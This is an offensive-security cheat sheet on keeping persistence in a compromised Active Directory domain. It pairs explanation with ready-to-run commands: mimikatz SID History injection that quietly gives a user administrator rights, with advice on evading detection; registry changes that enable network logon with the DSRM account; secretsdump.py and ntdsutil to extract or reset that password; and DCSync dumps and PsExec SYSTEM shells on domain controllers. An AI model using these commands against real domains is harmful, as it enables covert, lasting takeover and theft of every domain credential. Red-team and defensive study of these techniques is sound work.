# Active Directory - Persistence

### Kerberos "golden" / "silver" tickets

### SID History

The access to securable resources, that is resources that define a `security
descriptor`, is based on the `security principal`'s (user for example) `SID`,
eventual extra `SIDs`, and `security group SIDs`. Indeed, these `SIDs` are
compared to the access rights defined in the `Access Control Entries (ACEs)` of
the accessed object's `Discretionary Access Control List (DACL)`.

Adding a privileged `SID`, such as the one of the built-in domain Administrator
account (`SID` `S-1-5-21-<DOMAIN>-500`), in the `SID History` of a non
privileged user can thus be leveraged to maintain persistence in the domain
through a seemingly standard user. In order to avoid detection, a non built-in
user (`RID` > 1000) member of a privileged group (`Enterprise Admins`, `Domain
Admins`, `Administrators`, etc.) may be preferred. The persistence will be
operational until the impersonated user is deleted or removed from the
privileged group(s).

The modification of the `SIDHistory` attribute requires privileges granted to
the `Domain Admins` group and must be conducted on a Domain Controller as
the `ntds` service must be locally patched. While the `SID History`
modification will persist, the `ntds` patch will not be persistent across
reboot of the Domain Controller.

`mimikatz` can be used to add `SIDs` in the `SIDHistory` attribute of any users
of the current domain (the following commands must be executed directly on a
Domain Controller):

```
# If necessary, elevate privileges to "NT AUTHORITY\SYSTEM" and enables the "SeDebugPrivilege" privilege.
mimikatz # token::elevate
mimikatz # privilege::debug

# Patches the ntds service.
# Only the first patch ("Patch 1/2 ntds service patched") is required for the attack (the second patch may rise an error, such as "ERROR kull_m_patch_genericProcessOrServiceFromBuild", with out incidence).
mimikatz # sid::patch

# Adds the given SID in the SIDHistory attribute of the specified user.
# For example, S-1-5-21-<DOMAIN>-500 for built-in domain Administrator account.
mimikatz # sid::add /sam:<SAMACCOUNTNAME> /new:<S-1-5-21-<FOREST_DOMAIN>-519 | EXTRA_SID>

# Validates that the SID was correctly added.
# IDENTITY: SamAccountName, user Distinguished Name (DN), SID or GUID.
Get-ADUser <IDENTITY> -Properties SIDHistory
```

### Directory Services Restore Mode account

The `Directory Services Restore Mode (DSRM)` account correspond to the local
built-in `Administrator` (username language dependent name, `SID`
`S-1-5-21-<DC_SPECIFIC>-500`) of a Domain Controller. The `DRSM` account
password is specific to each Domain Controller and is setup during the Domain
Controller promulgation. The `DRSM` accounts are local to each Domain
Controller and have no link with the built-in `Administrator` (`SID`
`S-1-5-21-<DOMAIN>-500`) of the domain.    

Note that since `Windows Server 2008` (`KB961320`), the `DSRM` account password
can be one-time synchronized with a domain account (further synchronization are
however not automated and must be done manually).

The usage of the `DSRM` account is controlled by the `DsrmAdminLogonBehavior`
registry key:

| Value | Description |
|-------|-------------|
| `0x0` <br><br> `Undefined` | The `DSRM` account can only be used if the Domain Controller is booted in `DSRM`. <br><br> `bcdedit /set safeboot dsrepair` <br> `shutdown /r /f /t 5` |
| `0x1` | The `DSRM` account can login on the Domain Controller if the `Active Directory Domain Service (AD DS)` of the Domain Controller are (locally) stopped. |
| `0x2` | The `DSRM` account can login with out any restriction. |

By default, the `DsrmAdminLogonBehavior` key is undefined (and thus the `DSRM`
account can only be used to connect to the Domain Controller if it has been
restarted in `DSRM`).

To maintain persistence after a compromise of an Active Directory domain, the
local built-in `Administrator` password of a Domain Controller can be retrieved
(or set) and the `DsrmAdminLogonBehavior` of the Domain Controller set to
`0x2`. The `DSRM` account will be usable over the network even if the Domain
Controller is not started in `DSRM` and persistence maintained until its
password is renewed. In this scenario, the `DSRM` account can notably be used
to remotely connect to the Domain Controller or conduct replication operations
(`DCSync` attack).  

The following commands can be used to retrieve and set the value of the
`DsrmAdminLogonBehavior` registry key (on a Domain Controller):

```
# Retrieves the current value of the DsrmAdminLogonBehavior registry key.
reg query "HKLM\System\CurrentControlSet\Control\Lsa\" /v "DsrmAdminLogonBehavior"
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -Name "DsrmAdminLogonBehavior"

# Creates and sets the value of the DsrmAdminLogonBehavior registry key to the specified value.
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t "REG_DWORD" /d "<2 | VALUE>"
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -PropertyType DWORD -Value <2 | VALUE>

# Overrides the value of the DsrmAdminLogonBehavior registry key to the specified value (if the key already exists).
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /f /v "DsrmAdminLogonBehavior" /t "REG_DWORD" /d "<2 | VALUE>"
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value "<2 | VALUE>"
```

The following techniques can be used to retrieve or set the `DRSM` account
password:

```
# Remote extraction of the DRSM account (full dump of the local accounts stored in the SAM registry hive).
# For more information and techniques on how to retrieve the local Administrator NTLM hash from the SAM database, refer to the "[Windows] Post Exploitation" note.
secretsdump.py '<DOMAIN>/<USERNAME>[:<PASSWORD>]@<DC_HOSTNAME | DC_IP>'

# While not recommended from an opsec standpoint, the DRSM account password can also be reset (with out requiring knowledge of the current password).
ntdsutil
> set dsrm password
# "null" if the commands are executed locally on the Domain Controller of which the DRSM account password should be updated, its hostname otherwise.
> reset password on server <null | DC_HOSTNAME>
> <NEW_DRSM_PASSWORD>
> <NEW_DRSM_PASSWORD>
```

If the `DsrmAdminLogonBehavior` key of the targeted Domain Controller is set to
`0x2`, remote code execution or replication operations can be conducted using
the `DRSM` account:

```
# Refer to the "[ActiveDirectory] ntds.dit dumping" for more techniques to extract the secrets from the ntds.dit database.
secretsdump.py '<DC_HOSTNAME>/<Administrator | DRSM_ACCOUNT>:<DSRM_PASSWORD>@<DC_HOSTNAME | DC_IP>'
secretsdump.py -hashes <:DSRM_NTLM_HASH> '<DC_HOSTNAME>/<Administrator | DRSM_ACCOUNT>@<DC_HOSTNAME | DC_IP>'

# The DRSM account can be used through any authentication types (network logon, remote interactive logon, etc.).
# Refer to the "[Windows] Lateral movements" note for more techniques to remotely execute code on the targeted Domain Controller (through PsExec-like tools, WMI, WinRM, RDP, etc.).
PsExec.exe -accepteula \\<DC_HOSTNAME | DC_IP> -u "<DC_HOSTNAME>/<Administrator | DRSM_ACCOUNT>" -p "<DRSM_PASSWORD>" -s <cmd.exe | %ComSpec% | powershell.exe>
```
